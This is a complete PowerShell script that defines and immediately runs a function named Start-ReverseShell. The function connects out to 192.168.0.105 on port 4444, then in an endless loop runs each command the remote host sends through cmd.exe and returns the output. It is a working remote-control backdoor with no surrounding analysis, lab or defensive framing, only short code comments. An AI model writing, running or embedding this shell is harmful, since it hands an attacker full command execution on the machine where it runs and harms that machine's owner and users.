function Start-ReverseShell {
    param (
        [string]$IPAddress = '192.168.0.105',
        [int]$Port = 4444
    )

    try {
        $socket = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)

        function Send-Data {
            param($data)
            $writer.WriteLine($data)
            $writer.Flush()
        }

        function Receive-Data {
            $received = ''
            while ($stream.DataAvailable) {
                $received += $reader.ReadLine() + "`n"
            }
            return $received.Trim()
        }

        while ($true) {
            # Receive command from server
            $command = Receive-Data
            if ($command -ne '') {
                try {
                    # Execute the command and capture output
                    $output = & cmd.exe /c $command 2>&1
                    # Convert output to a single string
                    $outputString = [string]::Join("`n", $output)
                    # Send the output back to the server
                    Send-Data $outputString
                } catch {
                    Send-Data "Error executing command: $_"
                }
            }
            Start-Sleep -Milliseconds 100
        }
    } catch {
        Write-Error "An error occurred: $_"
    } finally {
        # Ensure cleanup even if an error occurs
        if ($null -ne $socket -and $socket.Connected) {
            $socket.Close()
        }
    }
}

# Call the function to start the reverse shell
Start-ReverseShell -IPAddress '192.168.0.105' -Port 4444